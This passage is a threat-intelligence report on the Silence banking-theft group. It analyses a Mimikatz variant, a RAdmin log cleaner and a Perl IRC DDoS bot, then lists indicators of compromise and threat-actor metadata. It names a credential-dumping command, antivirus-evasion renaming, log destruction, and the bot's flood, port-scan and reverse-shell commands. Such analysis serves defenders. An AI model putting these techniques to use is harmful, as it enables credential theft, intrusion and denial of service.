original mimikatz exe, version 2.1.1 x86,\nusing utility BinDiff, demonstrates that binary similarity between them is 25%\nand that this file has 91% of Mimikatz file functions.\n\n|File name|MD5 hash|Col3|Program type|\n|---|---|---|---|\n|m32.exe|40228a3ea22e61a0f536448|81cd59281|Mimikatz|\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n- The screenshot above shows the launch of this file for a random (knowingly\nnon-existent) command; the one below shows the launch of the original\nMimikatz.\n\n- Both apps responded identically to this argument in the command line,\nshowing a list of supported commands.\n\n\n-----\n\n**How Farse is different from the original Mimikatz source code**\n\n1. Banners and all mentions of \"mimikatz\" in the product are obliterated to the\nmaximum extent (although the developer could not do it everywhere). The\npurpose of this is obviously to hide this file from antivirus scanners.\n\n2. Some words – User, Domain, Password – are changed to U, D, P.\n\n3. Command names are different. The original command to extract OS\npasswords \"sekurlsa::logonpasswords\" is renamed as \"sss::logonpasswords\".\n\n4. Farse does not require the additional command \"mimikatz # privilege::debug\",\nunlike the original mimikatz. It automatically retrieves a debug privilege token\nto be able to extract data from the system process.\n\n5. This file automatically writes its results in the text file \"Farse.log\" in the\ncurrent directory. As an example, when an executable file is run with the\nargument \"sss::logonpasswords\", the extracted passwords and hashes will be\nsaved to this log file.\n\n6. User and system credentials are retrieved through the use of the function\n\"sss::logonpasswords\" (in the original source code, Mimikatz is called\n\"sekurlsa::logonpasswords\"). This function retrieves credentials from the lsass\nsystem process.exe (Local Security Authority Subsystem Service).\n\n###### Cleaner\n\n**File name** **MD5 hash** **Program type**\n\ncleaner.exe 8A9D278B473B6C5625D57739714702FC **RAdmin log cleaner**\n\nThis file is designed to write garbage to the log file of RAdmin server connections\ndeployed on the victim machine and to delete that file afterwards. Due to\nprogrammer’s error, garbage is written not to the beginning of the file, but to\nits end, which makes it possible to retrieve the original log. The program was\ncompiled on 08.10.2017 at 07:46:09.\n\nWhen run, the program generates random values whose length is file size\n\nC:\\Windows\\System32\\rserver30\\Radm_log.htm +10 up to\nC:\\Windows\\System32\\rserver30\\Radm_log.htm + 1024:\n\n|File name|MD5 hash|Col3|Program type|\n|---|---|---|---|\n|cleaner.exe|8A9D278B473B6C5625D57739|714702FC|RAdmin log cleaner|\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\nIt then writes them to the end of the file and deletes the file. Presumably,\nthe programmer’s intention was to have these random values written to the\nbeginning of the file so as to obstruct restoration of RAdmin connections logs. An\nimplementation error, however, prevents this from happening:\n\nThe argument FILE_END is thereby passed on to the function SetFilePointer, which\nmeans that the write pointer is set to the end of the file.\n\n###### Perl IRC DDoS bot\n\nThis bot is a Perl script designed to run on Linux OS. Its functionality includes\nretrieving information about the infected machine, executing shell commands\n(cmd), sending emails, downloading files, scanning ports and carrying out DDoS\nattacks. The server involved is 91.134.146[.]175:1984, communication protocol IRC,\nchannel name \"#PMA\".\n\n\n-----\n\nFirst of all, the script displays the message \"Irc Script Running!\\n\", after which the\nbot randomly selects its own version from among the following lines:\n\n```\n\"VERSION — unknown command.\"\n\"mIRC v5.91 K.Mardam-Bey\"\n\"mIRC v6.2 Khaled Mardam-Bey\"\n\"mIRC v6.03 Khaled Mardam-Bey\"\n\"mIRC v6.14 Khaled Mardam-Bey\"\n\"mIRC v6.15 Khaled Mardam-Bey\"\n\"mIRC v6.16 Khaled Mardam-Bey\"\n\"mIRC v6.17 Khaled Mardam-Bey\"\n\"mIRC v6.21 Khaled Mardam-Bey\"\n\"mIRC v6.31 Khaled Mardam-Bey\"\n\"mIRC v7.15 Khaled Mardam-Bey\"\n\n```\n\nIt uses IRC server 91.134.146[.]175 and port 1984. The server can be changed\nby sending the script an address as a parameter at the time of running the\nscript. After connection and authorization on the server, the script can receive\ncommands from and send execution results to the operator using its nickname.\nReceiving the command, the script checks if the message belongs to a particular\ninstance (checking is done across internal script parameters) and parses and\n**executes the following commands:**\n\n- PPING – receives the thread as a parameter which it then sends out as PONG\n<%string%>\n\n- PRIVMSG – contains a list of advanced commands. The command is executed\nonly after the script has checked a command for affiliation. For that purpose,\nthe server sends out (as parameters) the name of the infected system, the user\nname on the infected system and the values specific to a specific version of the\nscript.\n\n- NICK – changes the current script nickname (used during a check if a command\nis associated with a specific script instance).\n\n- 433 – the bot sends a message to the server: \"<%current nick%>-<%random\nvalue from 0 to 999%>\".\n\n- 001 – join the channel and send the message \"[PMA Bot]9,1I’m PMA!\" to the\nchannel\n\n**A list of extended commands:**\n\n|Command|Description|Col3|\n|---|---|---|\n|VERSION|Send the current version of|the bot to the server.|\n|help|Brief bot man||\n|system|Retrieve information about|the current bot instance|\n|version|Receive a bot version||\n|fol od|Bot man for DDoS||\n|channel|Man for general bot comma|nds|\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n|utils|Bot man for apps|Col3|\n|---|---|---|\n|die|Terminate bot operati|on|\n|join|Join the channel recei|ved as a parameter|\n|part|Leave the channel rec|eived as a parameter|\n|portscan|Get a list of open TCP as a parameter.|ports on the device whose ip address is received|\n|download|Download and save fli|e|\n|dns|Send to server the IP|address whose URL is received as a parameter.|\n|port|Check if the TCP port received as paramete|is open on a specifci device. IP and port are rs.|\n|udp1|Launch a UDP fol od at packets). The address parameters.|tack, packet length 64 to 1024 bytes (small , port, and attack duration are received as|\n|udp2|Launch a DDoS attack UDP, ICMP, TCP. Attack if the time set as a pa address of the victim, of the attack. Each UD|using all network protocols, and primarily IGMP, s all ports starting from 1 ending with the last one rameter is running. Received as a parameter: the the length of the message sent, and the duration P port is attacked twice.|\n|udp3|Launch an UDP DDoS the port, and the dura|attack using long packets, receiving the address, tion of the attack as parameters.|\n|tcp|Launch a TCP DDoS at port. The address, por a parameter. This com be transmitted in the this, however, is an er altogether: the script|tack. Opens 1,000 connections on a specifci t, and the duration of the attack are received as mand’s man indicates that 4 parameters must sequence: \"<ip > <port > <pack size > <time>\"; ror as the parameter\" <pack size>\" is missing does not send any messages to the victim.|\n|http|Launch an Http DDoS of the victim and the a message of the follo nHost: <%Victim URL% victim’s address.|attack. Parameters received include the address duration of the attack. The application sends wing type: \"GET / Http/1.1\\r\\nAccept: */*\\r\\ >\\r\\nConnection: Keep-Alive\\r\\n\\r\\n\" to the|\n|cback|Open a TCP connectio (or cmd commands in|n with a remote host to execute shell commands the case of Windows).|\n|mail|Send the message. Th content-type: text/ht From: <%second parm To: <%third parmeter <%forth parameter%> To send the message, parameter –t.|e body of the message: ml Subject: <%fri st parmeter%> eter%> %> it uses the utility \"/usr/sbin/sendmail\" with the|\n\n\n-----\n\nquit Terminate app operation\n\n|ctcpfol od (version with one parameter)|The bot sends the user with following messages: \"\\001VERSION\\001\\n\" \"\\001PING\\001\\n\" 10 times.|the nickname (the fri st parameter) the|\n|---|---|---|\n|msgfol od|Sends the user (whose nam with non-printable characte|e it receives as a parameter) a message rs.|\n|noticefol od|Similar to the \"msgfol od\" co for transmission.|mmand, but another IRC command is used|\n|maxifol od|Carries out the attack launc 5 times.|hed in ctcpfol od, msgfol od and noticefol od|\n|rejoin|Reconnect to the channel.||\n|op|Add operator status by nick parameters.|name. Status and nickname are received as|\n|deop|Delete operator status by ni as parameters.|ckname. Status and nickname are received|\n|voice|Add voice status by nicknam parameters.|e. Status and nickname are received as|\n|devoice|Delete voice status by nickn parameters.|ame. Status and nickname are received as|\n|msg|Send a message (the secon received as the fri st parame|d parameter) to the user whose nickname is ter.|\n|fol od|Send messages (the third p is received as the second pa parameter.|arameter) to the user whose nickname rameter. Number of messages: the fri st|\n|ctcp|The bot sends the user with the following message: \"\\00|the nickname [VK8] (the fri st parameter) 1<%param2%>\\001\".|\n|ctcpfol od (version with two parameters)|The bot sends the user with parameter) the following me number of messages is rece|the nickname [VK9] (the second ssages: \"\\001<%param3%>\\001\". The ived as a parameter.|\n|invite|Invite the user to the chann parameters.|el. The user and channel are received as|\n|newerver|Change the IRC server. The n parameter; standard port 6|ew nickname and address are received as a 667.|\n|nick|Change the nickname. The n|ew nickname is received as a parameter.|\n|raw|Sends to the server a messa|ge that is received as a parameter.|\n|eval|Run a module that is receiv|ed as a parameter.|\n|quit|Terminate app operation||\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n**A list of scanned TCP ports:**\n\n1,7,9,14,20,21,22,23,25,53,80,88,110,112,113,137,143,145,222,333,405,443,444,445,512,587,6\n16,666,993,995,1024,1025,1080,1144,1156,1222,1230,1337,1348,1628,1641,1720,1723,1763,19\n83,1984,1985,1987,1988,1990,1994,2005,2020,2121,2200,2222,2223,2345,2360,2500,2727\n,3130,3128,3137,3129,3303,3306,3333,3389,4000,4001,4471,4877,5252,5522,5553,5554,5\n642,5777,5800,5801,5900,5901,6062,6550,6522,6600,6622,6662,6665,6666,6667,6969,7\n000,7979,8008,8080,8081,8082,8181,8246,8443,8520,8787,8855,8880,8989,9855,9865,\n9997,9999,10000,10001,10010,10222,11170,11306,11444,12241,12312,14534,14568,15951,172\n72,19635,19906,19900,20000,21412,21443,21205,22022,30999,31336,31337,32768,33180,\n35651,36666,37998,41114,41215,44544,45055,45555,45678,51114,51247,51234,55066,5555\n5,65114,65156,65120,65410,65500,65501,65523,65533\n\n\n-----\n\n# INDICATORS\n\n###### Hashes\n```\n14863087695d0f4b40f480fd18d061a4 — Atmosphere.Dropper\n4107f2756edb33af1f79b1dce3d2fd77 — Atmosphere.Dropper\n6743f474e3a6a02bc1ccc5373e5ebbfa — Atmosphere.Dropper\ncefd39402d7f91d8cf5f1cd6ecbf0681 — Atmosphere.Dropper\nf69c35969745ae1b60403868e085062e — Atmosphere.Dropper\n\n```\n1ee9f88cc7867e021a818dff012bdf9e — Atmosphere.Injector\n```\nb3abb10cc8f4cbb454992b95064a9006 — Atmosphere.Injector\n79e61313febe5c67d168cfc3c88cd743 — Atmosphere.Payload\n\n```\n86ea1f46df745a30577f02fc24e266ff — Atmosphere.Payload\n```\nc49e6854c79043b624d07da20dd4c7ad — Atmosphere.Payload\nc8d0ccd2e58c1c467ee8b138c8a15eec — Atmosphere.Payload\nd81ae5e0680d09c118a1705762b0bfce — Atmosphere.Payload\nddb276dbfbce7a9e19feecc2c453733d — Atmosphere.Payload\n874e94cb3f076a21d3fb9da6eb541bab — CVE-2017-0199\n9b9757975d33c9c01b2d3de95d737202 — CVE-2017-0199\n00b470090cc3cdb30128c9460d9441f8 — CVE-2017-0262\n104913aa3bd6d06677c622dfd45b6c6d — CVE-2017-0262\n3be61ecba597022dc2dbec4efeb57608 — CVE-2017-0262\n4c1bc95dd648d9b4d1363da2bad0e172 — CVE-2017-0262\n57f51443a8d6b8882b0c6afbd368e40e — CVE-2017-0262\n5df8067a6fcb6c45c3b5c14adb944806 — CVE-2017-0262\n68e190efe7a5c6f1b88f866fc1dc5b88 — CVE-2017-0262\n98c5c33f5c0bd07ac3e24935edab202a — CVE-2017-0262\n9c7e70f0369215004403b1b289111099 — CVE-2017-0262\nc43f1716d6dbb243f0b8cd92944a04bd — CVE-2017-0262\ncfc0b41a7cde01333f10d48e9997d293 — CVE-2017-0262\ned74331131da5ac4e8b8a1c818373031 — CVE-2017-0262\nc3a70d2bf53f2eb6d05cafbb5e640855 — CVE-2017-11882 CVE-20180802\nd565500ebee6109edba0be7dea86bf72 — CVE-2018-8174\n081ee959cbe6bc7dde7a6d13168e4fb4 — DDoS Perl IrcBot\nee650c800d2eedd471ed59aa9435e55f — DDoS Perl IrcBot\naa9c31883b3d8e493efad2f983908be3 — DDoS Perl IrcBot\n40228a3ea22e61a0f53644881cd59281 — Farse/Mimikatz\n\n```\n9596e59ea38350bc181ce56ffa7d6453 — FTP\n```\n15d097a50718f2e7251433ea65401588 — HTA Script\n7b6345708e8d40254ab6fed6d124cc6d — HTA Script\n2ad83e13b2a36b398a8632ef6ce5aa07 — js-loader\n0074d8c3183e2b62b85a2b9f71d4ccd8 — kikothac\n440b21958ad0e51795796d3c1a72f7b3 — kikothac\n9628d7ce2dd26c188e04378d10fb8ef3 — kikothac\nb7f97100748857eb75a6558e608b55df — kikothac\ndfddcbcc3b15034ae733c858cb4e587b — LNK Downloader\ndd74fcfa1a985beeb972022e3a722589 — Silence MainModule\n3345dde0c827dcbda993f7216a8d7c12 — Silence.Downloader\n404d69c8b74d375522b9afe90072a1f4 — Silence.Downloader\n43eda1810677afe6791dd7a33eb3d83c — Silence.Downloader\n\n```\n\n-----\n\n###### Silence\nMoving into the darkside\n```\n5b4417521c71cc89cd3b2fe94ab395b2 — Silence.Downloader\n7d3614df9409da3933637f09587af28c — Silence.Downloader\n7d8af1f6cf7d08c0c39e03033585d404 — Silence.Downloader\n97599e2edc7e7025d5c2a7d7a81dac47 — Silence.Downloader\n9b037ead562c789620a167af85d32f72 — Silence.Downloader\na1e210598820cbb08e269b2dfd96e741 — Silence.Downloader\na58a830dce460e91217328bdefb25cbe — Silence.Downloader\nb09b8be361cd0e30a70cc4603a31d1ee — Silence.Downloader\nb4313151019b2091cbd27c8810e5c7c5 — Silence.Downloader\n\n```\nc6c84da4f27103db4ff593f4d4f45d95 — Silence.Downloader\n```\nef0fb10c602e3ee81e3677c83a44b409 — Silence.Downloader\n8a9d278b473b6c5625d57739714702fc — Silence.Cleaner\na3de4a1e5b66d96183ad42800d6be862 — Silence.MainModule\nb43f65492f2f374c86998bd8ed39bfdd — Silence.MainModule\n\n```\nc4f18d40b17e506f42f72b8ff111a614 — Silence.MainModule\ncfffc5a0e5bdc87ab11b75ec8a6715a4 — Silence.MainModule\n```\nf1954b7034582da44d3f6a160f0a9322 — Silence.MainModule\n121c7a3f139b1cc3d0bf62d951bbe5cb — Silence.ProxyBot\n88cb1babb591381054001a7a588f7a28 — Silence.ProxyBot\na6771cafd7114df25ac0ef2688722fdf — Silence.ProxyBot\na6cb04fad56f1fe5b8f60fabf2f64005 — Silence.ProxyBot\ndc4ac53350cc4b30839db19d8d6f3b5f — Silence.ProxyBot\n50565c4b80f41d2e7eb989cd24082aab — Silence.ProxyBot.Net\n8191dae4bdeda349bda38fd5791cb66f — Silence.ProxyBot.Net\n242b471bae5ef9b4de8019781e553b85 — Silence.SurviellanceModule\nd7491ed06a7f19a2983774fd50d65fb2 — Silence.SurviellanceModule\n1648437368e662fbe4805a1f95aa9fd0 — Smoke\ndde658eb388512ee9f4f31f0f027a7df — CHM\n\n###### E-mails\n\n Senders:\n\n```\ninfo@finamnews019[.]xyz\n\ndriley123@bellsouth[.]net\n\nbelov@ppfbank[.]ru\n\nbelov@vivacity[.]ru\n\ncap@jabber[.]sg\n\ncjlove143@ymail[.]com\n\ndriley123@bellsouth[.]net\n\niambrunk@sbcglobal[.]net\n\njosueruvalcaba@mail[.]com\n\npakovelli@mail[.]com\n\npayonline@fbank[.]org\n\nprokopenkovg@bankci[.]ru\n\nrevamped702@att[.]net\n\n\n-----\n\nsleof@fpbank[.]ru\n\nsvetlana@fcbank[.]ru\n\ntouqirkhan@mail[.]com\n\nyu_chernyshova@mail[.]com\n\n###### IPs\n\n|IPs|Col2|Col3|Col4|Col5|Col6|\n|---|---|---|---|---|---|\n|IP|Provider|Country||Program|Year|\n|46.183.221[.]89|DataClub S.A.|Latvia||Silence.ProxyBot|2016-07|\n|||||Kikothac||\n|87.98.227[.]83|OVH|Spain||Silence.ProxyBot|2016-08|\n|5.39.30[.]110|OVH|France||Silence.Downloader|2016-09|\n|46.183.221[.]37|DataClub S.A.|Latvia||Silence|2016-11|\n|54.36.191[.]97|OVH|France||Silence.Downloader|2017-10|\n|139.99.156[.]100|OVH|France||Exploit|2017-10|\n|185.161.208[.]61|DeltaHost|Ukraine||Silence.ProxyBot|2017-07 2018-02|\n|||||Silence||\n|||||Silence.ProxyBot. NET||\n|185.20.184[.]29|DeltaHost|Ukraine||Silence|2017-07|\n|||||Meterpreter secure2048[.]at||\n|137.74.224[.]142|OVH|France||Silence.Downloader|2017-08|\n|149.56.131[.]140|OVH|France||Meterpreter|2017-08 2017-10|\n|158.69.218[.]119|OVH|Canada||Silence.Downloader|2017-08|\n|5.188.231[.]89|MoreneHost Sinaro.host|The Netherl|ands|Unknown|2017-10|\n|185.29.10[.]117|DataClub S.A.|Sweden||Silence.ProxyBot|2017-09|\n|||||Silence.Downloader||\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\n|91.207.7[.]86|MaxiDed|P|oland|Silence.Downloader|2018-04|\n|---|---|---|---|---|---|\n|91.207.7[.]79|MaxiDed|P|oland|Silence.Downloader|2018-04|\n|||||JS downloader|2017-10|\n|5.154.191[.]105|Stephost|M|oldavia|exploit|2018-04|\n|144.217.14[.]173|OVH|Ca|nada|Exploit CVE-2017- 0199|2017-04|\n|144.217.162[.]168|OVH|Ca|nada|Silence.Downloader|2017-06|\n|164.132.228[.]29|OVH|Fr|ance|Silence.Downloader|2017-06|\n|185.29.11[.]126|DataClub S.A.|Th N|e etherlands|Kikothac|2017-12|\n|193.169.245[.]89|DeltaHost|Th N|e etherlands|Kikothac|2016-08|\n|51.255.200[.]161|OVH|Fr|ance|Exploit CVE-2017- 0199|2017-06|\n|91.243.80[.]200|MoreneHost|Th N|e etherlands|Exploit CVE-2017- 11882 + CVE-2018- 0802|2018-05|\n|92.222.68[.]32|OVH|Fr|ance|Silence.Downloader|2017-04|\n|||||Undernet DDoS bot|2017-09|\n|5.8.88[.]254|MoreneHost|Th N|e etherlands|Silence.Downloader|2018-05|\n|109.13.212[.]72|SFR SA|Fr|ance|pakovelli@mail[.] com|2017-08|\n|194.58.97[.]95|Reg.Ru|R|ussia|hacked fni amnews019[.]xyz|2017-10|\n|46.170.125[.]222||Po|land|yu_chernyshova@ mail[.]com|2017-08|\n|62.57.131[.]114||Sp|ain|touqirkhan@mail[.] com|2017-08|\n|77.246.145[.]202|E-PLANET|R|ussia|hacked vivacity[.]ru|2017-08|\n|91.207.7[.]97||Po|land|LNK downloader|2017-06|\n|||||JS downloader|2017-10|\n|ira.pubcs16[.]ro 91.134.146[.]175|OVH|Ir|eland|Undernet DDoS bot|2017-09|\n\n\n-----\n\n|IP|Real bank|Provider|Col4|Country|Date|\n|---|---|---|---|---|---|\n|5.200.55[.]198|bankrab[.]ru|OOO IT-Gr|ad|Russia|07-2016|\n|185.7.30[.]137|itbank[.]ru|VMLAB LL Customer|C VPS s|Russia|06-2017|\n\n\n###### Domains\n\n|Domains|Col2|Col3|\n|---|---|---|\n|Domain|Dat|e|\n|tvaudio[.]ru|07-2|016|\n|vivacity[.]ru|08-2|017|\n|fni amnews019[.]xyz|10-2|017|\n\n|Domain|IP|Provi|der|Country|Date|\n|---|---|---|---|---|---|\n|trustintbank[.]org|109.234.34[.]35|VDSIN Hosti|A VDS ng|Russia|2016-07|\n|itbank[.]us|193.0.178[.]12|PE Vi|ktor Tyurin|The Netherlands|2016-07|\n|itrbank[.]ru|31.31.204[.]161|Reg.R|u|Russia|2016-09|\n|itmbank[.]ru|185.100.67[.]129|Hoste|r.KZ|Kazakhstan|2016-09|\n|itmbank[.]us|46.30.43[.]83|Eurob|yte VPS|Russia|2016-09|\n|mosfni bank[.]ru|5.200.56[.]161|OOO|IT-Grad||2016-09|\n|mostbbank[.]ru|31.31.204[.]161|Reg.R|u|Russia|2016-09|\n||77.246.145[.]86|E-PLA|NET|Russia|2017-06|\n||77.246.145[.]82||||2017-06|\n|ppfbank[.]ru|185.158.154[.]147|IT-GR LLC|AD 1Cloud|Russia|2017-06|\n|fbank[.]org|185.158.154[.]17|IT-GR LLC|AD 1Cloud|Russia|2017-06|\n||185.154.53[.]132||||2017-06|\n|dgbank[.]ru|158.255.0[.]35|Mir Te Ltd|lematiki|Russia|2017-09|\n|bankci[.]ru|95.142.39[.]5|Eurob|yte VDS|Russia|2017-09|\n||95.142.39[.]6|Eurob|yte VDS|Russia|2017-09|\n|csbank[.]ru|185.180.231[.]63|FirstB|yte|Russia|2017-09|\n\n\n-----\n\n###### Silence\nMoving into the darkside\n\nfcbank[.]ru 195.161.41[.]2 Avguro Russia 2017-09\nTechnologies\n\n81.177.135[.]99 2017-10\n\nLtd. Hosting\nservice provider\n\nmmibank[.]ru 81.177.140[.]58 Avguro Russia 2017-09\nTechnologies\n\n81.177.6[.]226 2017-10\n\nLtd. Hosting\nservice provider\n\nspas- 185.235.130[.]69 ON-LINE DATA The 2018-01\nibosberbank[.]ru LTD Netherlands\n\nfpbank[.]ru 217.28.213[.]250 INTRELL-NET Russia 2018-05\n\n217.28.213[.]162 2018-05\n\n217.29.57[.]176 2018-05\n\n**Domain** **IP** **Program** **Year**\n\nvariiform[.]gdn 91.207.7[.]97 Smoke 2017-10\n\ncassocial[.]gdn\n\nsecure2048[.]at 185.20.184[.]29 Meterpreter 2017-07\n\n###### File system artifacts\n\n**Directories**\n\n- c:\\1\n\n- c:\\intel\n\n- c:\\atm\n\n**Files:**\n\n- C:\\Users\\<%username%>\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\\nPrograms\\Startup\\WINWORD.exe\n\n- C:\\ProgramData\\IntelSofts_<hex value>.exe\n\n- C:\\ProgramData\\MicrosoftsUpdte.exe\n\n- C:/Windows/temp/OBDP952.tmp.exe\n\n- apcs.exe\n\n- netsrvc32.exe\n\n- smmsrv.exe\n\n- MicrosoftsUpdte_<hex value>.exe\n\n- Intel Security.exe\n\n- pripr.exe\n\n|fcbank[.]ru|195.161.41[.]2|Avguro Technologies Ltd. Hosting service provider|Russia|2017-09|\n|---|---|---|---|---|\n||81.177.135[.]99|||2017-10|\n|mmibank[.]ru|81.177.140[.]58|Avguro Technologies Ltd. Hosting service provider|Russia|2017-09|\n||81.177.6[.]226|||2017-10|\n|spas- ibosberbank[.]ru|185.235.130[.]69|ON-LINE DATA LTD|The Netherlands|2018-01|\n|fpbank[.]ru|217.28.213[.]250|INTRELL-NET|Russia|2018-05|\n||217.28.213[.]162|||2018-05|\n||217.29.57[.]176|||2018-05|\n\n|Domain|IP|Col3|Program|Year|\n|---|---|---|---|---|\n|variiform[.]gdn|91.207.7[.]97||Smoke|2017-10|\n|cassocial[.]gdn|||||\n|secure2048[.]at|185.20.184[.]29||Meterpreter|2017-07|\n\n\n-----\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "99fdc3ef-333d-48f5-a4a1-becd788c7b80",
            "created_at": "2022-10-25T15:28:29.802983Z",
            "updated_at": "2022-10-25T15:28:29.802983Z",
            "deleted_at": null,
            "name": "MITRE",
            "url": "https://github.com/mitre-attack/attack-stix-data",
            "description": "MITRE ATT&CK STIX Data",
            "reports": null
        },
        {
            "id": "5d2b9e7f-cf43-4b54-ba18-065aa3003611",
            "created_at": "2022-10-25T16:06:24.199525Z",
            "updated_at": "2022-10-25T16:06:24.199525Z",
            "deleted_at": null,
            "name": "CyberMonitor",
            "url": "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections",
            "description": "APT & Cybercriminals Campaign Collection",
            "reports": null
        },
        {
            "id": "6fc23d14-23a6-4870-8fad-b291b182596f",
            "created_at": "2022-10-25T16:07:18.480113Z",
            "updated_at": "2022-10-25T16:07:18.480113Z",
            "deleted_at": null,
            "name": "ETDA",
            "url": "https://apt.etda.or.th",
            "description": "Threat Group Cards: A Threat Actor Encyclopedia",
            "reports": null
        },
        {
            "id": "99593a68-7f6e-400e-9a9f-a707f66d2e72",
            "created_at": "2022-11-23T11:07:14.353321Z",
            "updated_at": "2022-11-23T11:07:14.353321Z",
            "deleted_at": null,
            "name": "AGRO",
            "url": "https://apt.threattracking.com",
            "description": "APT Groups and Operations Spreadsheet",
            "reports": null
        }
    ],
    "references": [
        "https://www.group-ib.com/resources/threat-research/silence_moving-into-the-darkside.pdf",
        "https://github.com/CyberMonitor/APT_CyberCriminal_Campagin_Collections/raw/master/2018/2018.09.04.Silence/silence_moving-into-the-darkside.pdf"
    ],
    "report_names": [
        "silence_moving-into-the-darkside.pdf",
        "silence_moving-into-the-darkside"
    ],
    "threat_actors": [
        {
            "id": "42a6a29d-6b98-4fd6-a742-a45a0306c7b0",
            "created_at": "2022-10-25T15:50:23.710403Z",
            "updated_at": "2025-03-27T02:00:55.531313Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "Whisper Spider"
            ],
            "source_name": "MITRE:Silence",
            "tools": [
                "Winexe",
                "SDelete"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "c9617bb6-45c8-495e-9759-2177e61a8e91",
            "created_at": "2022-10-25T15:50:23.405039Z",
            "updated_at": "2025-03-27T02:00:55.462193Z",
            "deleted_at": null,
            "main_name": "Carbanak",
            "aliases": [
                "Carbanak",
                "Anunak"
            ],
            "source_name": "MITRE:Carbanak",
            "tools": [
                "Carbanak",
                "Mimikatz",
                "PsExec",
                "netsh"
            ],
            "source_id": "MITRE",
            "reports": null
        },
        {
            "id": "3b046db2-f60e-49ae-8e16-0cf82a4be6fb",
            "created_at": "2022-10-25T16:07:23.427162Z",
            "updated_at": "2025-03-27T02:02:09.79482Z",
            "deleted_at": null,
            "main_name": "Buhtrap",
            "aliases": [
                "Buhtrap",
                "Operation TwoBee",
                "Ratopak Spider",
                "UAC-0008"
            ],
            "source_name": "ETDA:Buhtrap",
            "tools": [
                "AmmyyRAT",
                "Buhtrap",
                "CottonCastle",
                "FlawedAmmyy",
                "NSIS",
                "Niteris EK",
                "Nullsoft Scriptable Install System",
                "Ratopak"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "a58aedbc-e89f-4e0c-8147-c6406a616cfa",
            "created_at": "2022-10-25T16:07:23.494355Z",
            "updated_at": "2025-03-27T02:02:09.831373Z",
            "deleted_at": null,
            "main_name": "Corkow",
            "aliases": [
                "Corkow",
                "Metel"
            ],
            "source_name": "ETDA:Corkow",
            "tools": [
                "Corkow",
                "Metel"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "746214d4-5d48-4644-b763-8e9a9c549c04",
            "created_at": "2022-10-25T16:07:23.878029Z",
            "updated_at": "2025-03-27T02:02:10.006583Z",
            "deleted_at": null,
            "main_name": "MoneyTaker",
            "aliases": [],
            "source_name": "ETDA:MoneyTaker",
            "tools": [
                "Kronos",
                "Metasploit",
                "MoneyTaker",
                "Screenshotter"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "88e53203-891a-46f8-9ced-81d874a271c4",
            "created_at": "2022-10-25T16:07:24.191982Z",
            "updated_at": "2025-03-27T02:02:10.13692Z",
            "deleted_at": null,
            "main_name": "Silence",
            "aliases": [
                "ATK 86",
                "Contract Crew",
                "TAG-CR8",
                "TEMP.TruthTeller",
                "Whisper Spider"
            ],
            "source_name": "ETDA:Silence",
            "tools": [
                "EDA",
                "EmpireDNSAgent",
                "Farse",
                "Ivoke",
                "Kikothac",
                "LOLBAS",
                "LOLBins",
                "Living off the Land",
                "Meterpreter",
                "ProxyBot",
                "ReconModule",
                "Silence.Downloader",
                "TiniMet",
                "TinyMet",
                "TrueBot",
                "xfs-disp.exe"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "610a7295-3139-4f34-8cec-b3da40add480",
            "created_at": "2023-01-06T13:46:38.608142Z",
            "updated_at": "2025-03-27T02:00:02.87217Z",
            "deleted_at": null,
            "main_name": "Cobalt",
            "aliases": [
                "Cobalt Gang",
                "GOLD KINGSWOOD",
                "COBALT SPIDER",
                "G0080",
                "Mule Libra",
                "Cobalt Group"
            ],
            "source_name": "MISPGALAXY:Cobalt",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "01d569b1-f089-4a8f-8396-85078b93da26",
            "created_at": "2023-01-06T13:46:38.411615Z",
            "updated_at": "2025-03-27T02:00:02.826863Z",
            "deleted_at": null,
            "main_name": "BuhTrap",
            "aliases": [],
            "source_name": "MISPGALAXY:BuhTrap",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "e5364c16-eb97-467e-a8c2-a720269498c1",
            "created_at": "2023-01-06T13:46:38.733469Z",
            "updated_at": "2025-03-27T02:00:02.904201Z",
            "deleted_at": null,
            "main_name": "MoneyTaker",
            "aliases": [],
            "source_name": "MISPGALAXY:MoneyTaker",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f4f16213-7a22-4527-aecb-b964c64c2c46",
            "created_at": "2024-06-19T02:03:08.090932Z",
            "updated_at": "2025-03-27T02:05:17.387119Z",
            "deleted_at": null,
            "main_name": "GOLD NIAGARA",
            "aliases": [
                "Carbanak",
                "Carbon Spider ",
                "FIN7 ",
                "Navigator ",
                "Sangria Tempest ",
                "TelePort Crew ",
                "Calcium "
            ],
            "source_name": "Secureworks:GOLD NIAGARA",
            "tools": [
                " Carbanak",
                " Cobalt Strike",
                " DICELOADER",
                " DRIFTPIN",
                " GGLDR",
                " GRIFFON",
                " JSSLoader",
                " Meterpreter",
                " OFFTRACK",
                " PILLOWMINT",
                " POWERTRASH",
                " SUPERSOFT",
                " TAKEOUT",
                " TinyMet",
                "Bateleur"
            ],
            "source_id": "Secureworks",
            "reports": null
        },
        {
            "id": "e3767160-695d-4360-8b2e-d5274db3f7cd",
            "created_at": "2022-10-25T16:47:55.914348Z",
            "updated_at": "2025-03-27T02:05:17.411172Z",
            "deleted_at": null,
            "main_name": "IRON TWILIGHT",
            "aliases": [
                "ATK5 ",
                "Blue Athena ",
                "BlueDelta ",
                "FROZENLAKE ",
                "Fancy Bear ",
                "Fighting Ursa ",
                "Forest Blizzard ",
                "GRAPHITE ",
                "Group 74 ",
                "PawnStorm ",
                "STRONTIUM ",
                "Sednit ",
                "Snakemackerel ",
                "Sofacy ",
                "TG-4127 ",
                "Tsar Team ",
                "APT28 "
            ],
            "source_name": "Secureworks:IRON TWILIGHT",
            "tools": [
                " Downdelph",
                " Drovorub",
                " EVILTOSS",
                " HIDEDRV",
                " Headlace",
